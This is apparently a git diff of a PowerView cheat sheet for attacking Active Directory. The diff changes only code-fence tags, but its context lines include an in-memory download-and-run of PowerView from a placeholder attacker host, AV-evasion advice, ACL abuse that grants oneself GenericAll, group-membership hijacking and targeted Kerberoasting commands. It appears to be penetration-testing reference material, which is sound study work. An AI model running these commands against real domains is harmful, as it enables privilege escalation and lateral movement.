@@ -7,7 +7,7 @@ PowerView is the go-to Windows-side enumeration and manipulation library for AD.
 
 Import PowerView and bypass execution policy restrictions. Always load from a writable path or memory if AV is active.
 
-```powershell
+```powershell wrap
 # Load from disk
 Import-Module .\PowerView.ps1
 
@@ -23,7 +23,7 @@ IEX (New-Object Net.WebClient).DownloadString('http://$LHOST/PowerView.ps1')
 
 Use credential objects to run commands as a different user without switching your session. Essential when you have creds for a user but are not running as them.
 
-```powershell
+```powershell wrap
 # Build a credential object
 $pass = ConvertTo-SecureString '$PASSWORD' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('$DOMAIN\$USER', $pass)
@@ -37,7 +37,7 @@ Get-DomainGroup -Credential $cred -Identity "Core Staff"
 
 PS Remoting gives you an interactive PowerShell session on a remote host over WinRM (port 5985/5986). Requires the account to be in Remote Management Users or be a local admin.
 
-```powershell
+```powershell wrap
 # Interactive session
 Enter-PSSession -ComputerName $TARGET -Credential $cred
 
@@ -61,7 +61,7 @@ Copy-Item -Path .\tool.exe -Destination C:\Windows\Temp\tool.exe -ToSession $ses
 
 Core enumeration commands. These are the ones you run right after getting a foothold or credential.
 
-```powershell
+```powershell wrap
 # Users
 Get-DomainUser                                                  # all domain users
 Get-DomainUser -Identity $TARGET                               # specific user
@@ -95,7 +95,7 @@ Get-DomainOU                                                   # all OUs
 
 Modify object permissions. Used when you have ownership or WriteDACL over an object and need to grant yourself additional rights.
 
-```powershell
+```powershell wrap
 # Grant yourself (or another principal) GenericAll on a target object
 Add-DomainObjectAcl -TargetIdentity $TARGET -PrincipalIdentity $USER -Rights All
 
@@ -116,7 +116,7 @@ Remove-DomainObjectAcl -TargetIdentity $TARGET -PrincipalIdentity $USER -Rights 
 
 Add or remove members from groups. Requires WriteMember or GenericWrite on the group object.
 
-```powershell
+```powershell wrap
 # Add a user to a group
 Add-DomainGroupMember -Identity "Core Staff" -Members $USER
 Add-DomainGroupMember -Credential $cred -Identity "Core Staff" -Members $USER
@@ -132,7 +132,7 @@ Get-DomainGroupMember -Identity "Core Staff"
 
 Set arbitrary properties on AD objects. Requires GenericWrite or WriteProperty on the target.
 
-```powershell
+```powershell wrap
 # Set an SPN on a user (Targeted Kerberoasting)
 Set-DomainObject -Identity $TARGET -Set @{serviceprincipalname="fake/spn.$DOMAIN"}
 
@@ -156,7 +156,7 @@ A common BloodHound path: you own a group but are not a member of it, and do not
 | Member | Is listed inside the group and inherits the group's privileges |
 | WriteMember / GenericWrite | Can add or remove members from the group |
 
-```powershell
+```powershell wrap
 # Step 1: Build a credential object for the account that owns the group
 $pass = ConvertTo-SecureString '$PASSWORD' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('$DOMAIN\$USER', $pass)
